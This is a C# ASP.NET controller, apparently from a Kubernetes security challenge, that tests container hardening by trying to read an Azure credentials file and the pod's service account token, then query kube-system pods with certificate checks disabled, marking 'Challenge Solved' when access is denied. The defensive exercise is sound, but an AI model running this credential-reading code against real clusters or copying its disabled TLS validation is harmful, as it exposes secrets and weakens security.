using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace TeamGameHub.GameEngine.Sidecar.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class ExploitController : ControllerBase
    {
        private readonly ILogger<ExploitController> _logger;
        private HttpClient _httpClient;
        private string _kubeApiUri;
        private HttpClientHandler _clientHandlerForUnsecureTraffic;

        public ExploitController(ILogger<ExploitController> logger)
        {

            _clientHandlerForUnsecureTraffic = new HttpClientHandler();
            _clientHandlerForUnsecureTraffic.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;

            _logger = logger;
            _httpClient = new HttpClient(_clientHandlerForUnsecureTraffic);
            _kubeApiUri = "https://" + Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_HOST") + ":" + Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_PORT")+"/"; ;
            _httpClient.BaseAddress = new Uri(_kubeApiUri);
            Console.WriteLine("Kubernetes API running at " + _kubeApiUri);
        }

        [HttpGet]
        public async Task<object> GetAsync(bool readSecrets)
        {

            // check for access to /meshconfig/azure.json
            var meshconfigContent = String.Empty;
            try
            {
                 meshconfigContent = System.IO.File.ReadAllText("/meshconfig/azure.json");
            }
            catch (UnauthorizedAccessException uae)
            {
                meshconfigContent = "Challenge Solved: Can't access file /meshconfig/azure.json";
                Console.WriteLine(meshconfigContent);
            }
            
            // try to access kubeapi
            var token = System.IO.File.ReadAllText("/var/run/secrets/kubernetes.io/serviceaccount/token");

            
            

            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
            var podRequestResult = await _httpClient.GetAsync("api/v1/namespaces/kube-system/pods");
            
            var podExploitContent = String.Empty;
            if (podRequestResult.StatusCode.Equals(HttpStatusCode.Forbidden))
            {
                podExploitContent = "Challenge Solved: Can't access KubeApi - 403!";
                Console.WriteLine("Can't access KubeApi");
            }
            else
            {
                podExploitContent = await podRequestResult.Content.ReadAsStringAsync();
            }

            var result = new { exploitedMeshContent = meshconfigContent, exploitedPodList = podExploitContent  };
            return result;                     

            
        }
    }
}
